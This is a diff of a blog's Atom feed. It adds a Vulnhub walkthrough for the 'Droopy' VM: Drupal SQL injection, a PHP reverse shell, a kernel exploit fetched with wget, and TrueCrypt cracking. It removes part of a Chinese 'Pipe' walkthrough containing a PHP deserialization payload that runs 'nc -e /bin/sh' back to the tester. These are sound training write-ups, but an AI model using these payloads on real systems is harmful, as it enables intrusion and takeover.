@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | tick.Tack]]></title>
   <link href="http://newdominic.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://newdominic.github.io/"/>
-  <updated>2016-06-19T20:32:40+08:00</updated>
+  <updated>2016-06-29T00:34:21+08:00</updated>
   <id>http://newdominic.github.io/</id>
   <author>
     <name><![CDATA[DMC]]></name>
@@ -12,6 +12,295 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Droopy: v0.2]]></title>
+    <link href="http://newdominic.github.io/blog/2016/06/20/droopyv0.2/"/>
+    <updated>2016-06-20T15:22:33+08:00</updated>
+    <id>http://newdominic.github.io/blog/2016/06/20/droopyv0.2</id>
+    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/droopy-v02,143/">Droopy: v0.2</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>Nmap scan result</p>
+
+<pre><code># Nmap 6.49BETA4 scan initiated Sun Jun 19 08:07:56 2016 as: nmap -Pn -T5 -o nmap_result 192.168.0.111
+Warning: 192.168.0.111 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.0.111
+Host is up (0.00026s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 08:00:27:48:50:BF (Cadmus Computer Systems)
+</code></pre>
+
+<h2>Limited Shell</h2>
+
+<p>The website on port 80 is based on Drupal 7. First I tried scanning it with <a href="https://github.com/droope/droopescan">droopescan</a>.</p>
+
+<pre><code># droopescan scan drupal -u http://192.168.0.112/ -t 8
+[+] No themes found.
+
+[+] Possible interesting urls found:
+    Default changelog file - http://192.168.0.112/CHANGELOG.txt
+
+[+] Possible version(s):
+    7.30
+
+[+] No plugins found.
+
+[+] Scan finished (0:00:04.024569 elapsed)
+</code></pre>
+
+<p>Then I found an SQL injection <a href="https://www.exploit-db.com/exploits/34993/">exploit</a> for Drupal Core &lt;= 7.32. Modifing the <strong>$url</strong> is necessary. After firing it up, we&rsquo;ll receive the success message.</p>
+
+<pre><code># php 34993.php
+Success! Log in with username "admin" and password "admin" at http://192.168.0.112/user/login
+</code></pre>
+
+<p>Now let&rsquo;s verify if it exploited correctly.</p>
+
+<p><img src="/images/2016-06-21-droopyv0.2/3.png"></p>
+
+<p>Okay! We&rsquo;re logged in as <strong>admin</strong>. Time to search for futher vulnerabilities.</p>
+
+<p>By browsing the <strong>Modules</strong> page, there&rsquo;s an interesting module called &lsquo;<strong>PHP filter</strong>&rsquo; which might be useful to get an reverse shell.</p>
+
+<p><img src="/images/2016-06-21-droopyv0.2/1.png"></p>
+
+<p>Let&rsquo;s get the checkbox checked and save the configuration. Now press <strong>Add content</strong>-><strong>Basic page</strong>, put the reverse shell code in the <strong>Body</strong> textbox. Finally, choose the <strong>Text format</strong> to <strong>PHP code</strong>.</p>
+
+<p><img src="/images/2016-06-21-droopyv0.2/2.png"></p>
+
+<p>Before pressing the <strong>Preview</strong> button, make sure you already have netcat listening.</p>
+
+<pre><code># nc -lvp 6666
+listening on [any] 6666 ...
+192.168.0.112: inverse host lookup failed: Unknown host
+connect to [192.168.0.105] from (UNKNOWN) [192.168.0.112] 49779
+Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+ 09:16:53 up 4 min,  0 users,  load average: 0.02, 0.11, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>By doing some enumeration, we can see the system is <strong>Ubuntu 14.04</strong>, and the Kernel version is <strong>3.13.0-43-generic</strong>.</p>
+
+<pre><code># uname -a
+Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+# cat /etc/os-release
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+</code></pre>
+
+<p>There&rsquo;s an <a href="https://www.exploit-db.com/exploits/37292/">exploit</a> that will give us the root privilege. All you need to do is to download it, compile it to an executable file, then run the exploit.</p>
+
+<pre><code>$ cd /tmp
+$ wget http://192.168.0.105:8000/37292.c -O exp.c
+--2016-06-21 09:18:44--  http://192.168.0.105:8000/37292.c
+Connecting to 192.168.0.105:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5123 (5.0K) [text/plain]
+Saving to: 'exp.c'
+
+     0K .....                                                 100% 1.09G=0s
+
+2016-06-21 09:18:44 (1.09 GB/s) - 'exp.c' saved [5123/5123]
+
+$ gcc -o exp.c exp
+gcc: error: exp: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+$ gcc -o exp exp.c
+$ ./exp
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# 
+</code></pre>
+
+<h2>Capther the flag</h2>
+
+<pre><code># ls -al /root
+total 5148
+drwx------  3 root root    4096 Apr 12 13:51 .
+drwxr-xr-x 22 root root    4096 Apr 10 12:02 ..
+-rw-r--r--  1 root root    3106 Feb 20  2014 .bashrc
+drwx------  2 root root    4096 Apr 10 12:02 .cache
+-rw-r--r--  1 root root     140 Feb 20  2014 .profile
+-rw-------  1 root root    3771 Apr 11 13:11 .viminfo
+-rw-r--r--  1 root root 5242880 Apr 12 13:18 dave.tc
+</code></pre>
+
+<p>When I got the root privilege, I thought this boot2root machine is done. But it&rsquo;s weird that there&rsquo;s no flag file in the root directory, only a large data file called <strong>dave.tc</strong> is found. Then I went back to vulnhub and check the description again.</p>
+
+<p><img src="/images/2016-06-21-droopyv0.2/4.png"></p>
+
+<p>It tells us to &lsquo;read other people&rsquo;s mail&rsquo;. And there is a mail found under <strong>/var/mail</strong>.</p>
+
+<pre><code># cat /var/mail/www-data
+From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
+Date: 14 Apr 2016 04:34:39 +0100
+From: Dave &lt;dave@droopy.example.com&gt;
+Subject: rockyou with a nice hat!
+Message-ID: &lt;730262568@example.com&gt;
+X-IMAP: 0080081351 0000002016
+Status: NN
+
+George,
+
+   I've updated the encrypted file... You didn't leave any
+hints for me. The password isn't longer than 11 characters
+and anyway, we know what academy we went to, don't you...?
+
+I'm sure you'll figure it out it won't rockyou too much!
+
+If you are still struggling, remember that song by The Jam
+
+Later,
+Dave
+</code></pre>
+
+<p>So, the <strong>dave.tc</strong> file is an encrypted file, which has a password not longer than 11 characters. The &lsquo;.tc&rsquo; file extension may indicated this file is encrypted with TrueCrypt. Hence I will try to crack with <strong>truecrack</strong>.</p>
+
+<p>The second hint said that we might need the rockyou wordlist. But now we know the password is less than 11 characters. So I will make a custome wordlist first to save some time.</p>
+
+<pre><code># cat rockyou.txt | awk 'length($0)&lt;12' &gt; my_wordlist
+# cat my_wordlist | wc -l
+12770785
+</code></pre>
+
+<p>There are too many lines in this file, I don&rsquo;t think it is worth to run the whole wordlist. So I checked the mail again, then decided to use &lsquo;academy&rsquo; and &lsquo;Academy&rsquo; to make the wordlists smaller.</p>
+
+<pre><code>root@kali:~/Security/droopy# grep academy my_wordlist &gt; academy_wordlist
+root@kali:~/Security/droopy# cat academy_wordlist | wc -l
+94
+root@kali:~/Security/droopy# grep Academy my_wordlist &gt; Academy_wordlist
+root@kali:~/Security/droopy# cat Academy_wordlist | wc -l
+5
+</code></pre>
+
+<p>Now I have two smaller wordlists, then we can try them with truecrack.</p>
+
+<pre><code>root@kali:~/Security/droopy# truecrack -t dave.tc -w academy_wordlist
+TrueCrack v3.0
+Website: http://code.google.com/p/truecrack
+Contact us: infotruecrack@gmail.com
+No found password
+Total computations:     "94"
+root@kali:~/Security/droopy# truecrack -t dave.tc -w Academy_wordlist
+TrueCrack v3.0
+Website: http://code.google.com/p/truecrack
+Contact us: infotruecrack@gmail.com
+No found password
+Total computations:     "5"
+</code></pre>
+
+<p>It ran fast. But both of them failed.</p>
+
+<p>I couldn&rsquo;t find any other method to crack the TrueCrypt files. But I noticed something in the truecrack help:</p>
+
+<pre><code>-k --key &lt;ripemd160 | sha512 | whirlpool&gt;      Key derivation function (default ripemd160).
+</code></pre>
+
+<p>Maybe <strong>dave.tc</strong> is encrypted with different key derivation function. So I ran the command again with &lsquo;-k sha512&rsquo;.</p>
+
+<pre><code># truecrack -t dave.tc -w academy_wordlist -k sha512
+TrueCrack v3.0
+Website: http://code.google.com/p/truecrack
+Contact us: infotruecrack@gmail.com
+Found password:         "etonacademy"
+Password length:        "12"
+Total computations:     "40"
+</code></pre>
+
+<p>We got the password! All we need to do is, to find the tool available to decrypt the TrueCrypt file. After spending some time googling, I found <a href="https://tails.boum.org/doc/encryption_and_privacy/truecrypt/index.en.html">cryptsetup</a> might be useful.</p>
+
+<pre><code># cryptsetup open --type tcrypt ./dave.tc davetc
+Enter passphrase:
+# mkdir /media/davetc
+# mount /dev/mapper/davetc /media/davetc
+# cd /media/davetc
+# ls -alR
+.:
+total 20
+drwxr-xr-x 6 root root  1024 Apr 12 20:00 .
+drwxr-xr-x 4 root root  4096 Jun 21 21:49 ..
+drwxr-xr-x 2 root root  1024 Apr 12 19:54 buller
+drwx------ 2 root root 12288 Apr 12 19:53 lost+found
+drwxr-xr-x 2 root root  1024 Apr 12 19:58 panama
+drwxr-xr-x 3 root root  1024 Apr 12 20:02 .secret
+
+./buller:
+total 11
+drwxr-xr-x 2 root root 1024 Apr 12 19:54 .
+drwxr-xr-x 6 root root 1024 Apr 12 20:00 ..
+-rw-r--r-- 1 root root 8393 Oct  5  2013 BullingdonCrest.jpg
+
+./lost+found:
+total 13
+drwx------ 2 root root 12288 Apr 12 19:53 .
+drwxr-xr-x 6 root root  1024 Apr 12 20:00 ..
+
+./panama:
+total 52
+drwxr-xr-x 2 root root  1024 Apr 12 19:58 .
+drwxr-xr-x 6 root root  1024 Apr 12 20:00 ..
+-rw-r--r-- 1 root root 49257 Jun 16  2014 shares.jpg
+
+./.secret:
+total 64
+drwxr-xr-x 3 root root  1024 Apr 12 20:02 .
+drwxr-xr-x 6 root root  1024 Apr 12 20:00 ..
+-rw-r--r-- 1 root root 61118 Feb 25 16:57 piers.png
+drwxr-xr-x 2 root root  1024 Apr 12 20:16 .top
+
+./.secret/.top:
+total 3
+drwxr-xr-x 2 root root 1024 Apr 12 20:16 .
+drwxr-xr-x 3 root root 1024 Apr 12 20:02 ..
+-r-------- 1 root root  872 Apr 12 20:16 flag.txt
+</code></pre>
+
+<p>Now we see the flag here.</p>
+
+<pre><code># cat ./.secret/.top/flag.txt
+
+################################################################################
+#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
+#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
+# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
+#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
+#                                                                              #
+################################################################################
+
+Firstly, thanks for trying this VM. If you have rooted it, well done!
+
+Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
+goes to barrebas and junken for help in testing and final configuration.
+                                                                    --knightmare
+</code></pre>
+
+<p>Finally, don&rsquo;t forget to unmount and close the volume.</p>
+
+<pre><code># umount /media/davetc
+# cryptsetup close davetc 
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[VulnOS: 2]]></title>
@@ -967,303 +1256,6 @@ Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>&l
 &lt;h1&gt;id&lt;/h1&gt;
 
 &lt;p&gt;uid<span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span></code></pre></div></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[/dev/random: Pipe]]></title>
-    <link href="http://newdominic.github.io/blog/2015/12/23/pipe/"/>
-    <updated>2015-12-23T00:38:42+08:00</updated>
-    <id>http://newdominic.github.io/blog/2015/12/23/pipe</id>
-    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">/dev/random: Pipe</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
-
-<!--more-->
-
-
-<hr />
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p- -T5 -n&lt;/p&gt;
-
-&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-21 04:55 CST
-Warning: 192.168.0.118 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
-Nmap scan report <span class="k">for</span> 192.168.0.118
-Host is up <span class="o">(</span>0.00019s latency<span class="o">)</span>.
-Not shown: <span class="m">65531</span> closed ports
-PORT      STATE SERVICE
-22/tcp    open  ssh
-80/tcp    open  http
-111/tcp   open  rpcbind
-35856/tcp open  unknown
-MAC Address: 08:00:27:D7:0B:8C <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>&lt;/p&gt;
-
-&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 513.72 seconds</code></pre></div></p>
-
-<p>nmap掃出了四個開啟的port，先來看一下port 80</p>
-
-<p><img class="center" src="/images/2015-12-23-pipe/web.png"></p>
-
-<p>&hellip;&hellip;第一次遇到首頁就要輸入帳號密碼的</p>
-
-<p>35856不知道做甚麼用的，再深入掃瞄試試</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p 22,80,111,35856 -A -O
-<span class="p">&amp;</span>hellip<span class="p">;</span>
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey:
-<span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>&lt;em&gt;  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
-80/tcp    open  http    Apache httpd
-<span class="p">|</span> http-auth:
-<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
-<span class="p">|</span>&lt;/em&gt;  Basic <span class="nv">realm</span><span class="o">=</span>index.php
-<span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
-<span class="p">|</span>&lt;/em&gt;http-server-header: Apache
-<span class="p">|</span>&lt;em&gt;http-title: <span class="m">401</span> Unauthorized
-111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
-<span class="p">|</span> rpcinfo:
-<span class="p">|</span>   program version   port/proto  service
-<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
-<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
-<span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35856/tcp  status
-<span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          44438/udp  status
-35856/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span></code></pre></div></p>
-
-<p>結果是rpc對應的port。</p>
-
-<p>在不知道能做甚麼的情況下，只好回到網頁的部分亂試一通</p>
-
-<p>最後試到只要在request method的部分不要用GET就能繞過認證了</p>
-
-<p><img class="center" src="/images/2015-12-23-pipe/index.png"></p>
-
-<p>接著檢視一下程式碼</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;
-
-&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span>&gt;&lt;/script&gt;
-
-
-&lt;p&gt;&lt;script&gt;
-<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
-var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>id: 1, firstname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Rene<span class="p">&amp;</span>rsquo<span class="p">;</span>, surname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rsquo<span class="p">;</span>, artwork: <span class="p">&amp;</span>lsquo<span class="p">;</span>The Treachery of Images<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
-<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
-<span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:4:<span class="se">\&quot;</span>Info<span class="se">\&amp;</span>rdquo<span class="p">;</span>:4:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
-document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
-document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
-<span class="o">}</span>
-<span class="p">&amp;</span>hellip<span class="p">;</span>
-&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
-   &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> /&gt;
-   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span>&gt;Show Artist Info.&lt;/a&gt;
-&lt;/form&gt;&lt;/center&gt;&lt;/html&gt;</code></pre></div></p>
-
-<p>scriptz目錄是開放的，從裡面獲得另一個檔案&#8221;log.php.BAK&#8221;</p>
-
-<p>這個class會在destruct的時候將data的內容寫入filename</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">&amp;</span>lt<span class="p">;</span>?php
-class Log
-<span class="o">{</span>
-    public <span class="nv">$filename</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>
-    public <span class="nv">$data</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;public <span class="k">function</span> __construct<span class="o">()</span>
-<span class="o">{</span>
-    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-<span class="o">}</span>
-
-public <span class="k">function</span> PrintLog<span class="o">()</span>
-<span class="o">{</span>
-    <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
-    <span class="nv">$now</span> <span class="o">=</span> date<span class="o">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="o">)</span><span class="p">;</span>
-
-    <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&amp;gt;data&#39;</span><span class="p">;</span>
-    <span class="nb">eval</span><span class="o">(</span><span class="s2">&quot;\$str = \&quot;$str\&quot;;&quot;</span><span class="o">)</span><span class="p">;</span>
-    <span class="nb">echo</span> <span class="nv">$str</span><span class="p">;</span>
-<span class="o">}</span>
-
-public <span class="k">function</span> __destruct<span class="o">()</span>
-<span class="o">{</span>
-    file_put_contents<span class="o">(</span><span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>filename, <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>data, FILE_APPEND<span class="o">)</span><span class="p">;</span>
-<span class="o">}</span>
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;<span class="o">}</span>
-?&gt;</code></pre></div></p>
-
-<p>按下頁面下方的Show Artist Info之後，瀏覽器會POST一些經過serialize處理後的資訊到index.php</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">param</span><span class="o">=</span>O:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Info<span class="p">&amp;</span>rdquo<span class="p">;</span>:4:<span class="o">{</span>s:2:<span class="p">&amp;</span>ldquo<span class="p">;</span>id<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Rene<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:8:<span class="p">&amp;</span>ldquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>artwork<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:23:<span class="p">&amp;</span>ldquo<span class="p">;</span>The+Treachery+of+Images<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span>&lt;/p&gt;
-
-&lt;p&gt;</code></pre></div></p>
-
-<p>serialize的做法在php.js</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">//   example 1: serialize<span class="o">([</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
-//   returns 1: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>i:0<span class="p">;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:2<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span>
-//   example 2: serialize<span class="o">({</span>firstName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, midName: <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, surName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
-//   returns 2: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>midName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span></code></pre></div></p>
-
-<p>接著將submit_form()的內容改成要送出的資訊</p>
-
-<p><img class="center" src="/images/2015-12-23-pipe/html.png"></p>
-
-<p>選擇送到scriptz是因為可以直接進到scriptz的目錄確認有沒有寫入成功</p>
-
-<p><img class="center" src="/images/2015-12-23-pipe/yo.png"></p>
-
-<p>而data的內容看起來也是成功寫入yo.php了</p>
-
-<p><img class="center" src="/images/2015-12-23-pipe/yo2.png"></p>
-
-<p>再來就試試看能不能送個reverse shell回來</p>
-
-<p>直接修改html的內容</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;script&gt;
-<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
-  var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>filename: <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/html/scriptz/shell.php<span class="p">&amp;</span>rsquo<span class="p">;</span>, data: <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>lt<span class="p">;</span>?php passthru<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc -e /bin/sh 192.168.0.115 22234<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> ?&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
-<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
-  <span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:3:<span class="se">\&quot;</span>Log<span class="se">\&amp;</span>rdquo<span class="p">;</span>:2:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
-document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
-document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
-<span class="o">}</span>
-&lt;/script&gt;</code></pre></div></p>
-
-<p>連上 <a href="http://192.168.0.117/scriptz/shell.php">http://192.168.0.117/scriptz/shell.php</a> 之後瀏覽器就卡住了</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nc -lp 22234
-id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-uname -a
-Linux pipe 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span></code></pre></div></p>
-
-<p>shell GET!</p>
-
-<p>簡單地蒐集資訊之後，找到一個使用者 rene ，而且他的家目錄沒有擋權限</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ls -al
-total 208
-drwxrwxrwx <span class="m">2</span> rene rene   <span class="m">4096</span> Dec <span class="m">23</span> 05:04 .
-drwxr-xr-x <span class="m">3</span> rene rene   <span class="m">4096</span> Jul  <span class="m">6</span> 07:42 ..
--rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene <span class="m">124078</span> Dec <span class="m">23</span> 05:00 backup.tar.gz
--rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">26558</span> Dec <span class="m">23</span> 05:02 sys-12512.BAK
--rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">11402</span> Dec <span class="m">23</span> 05:01 sys-23924.BAK
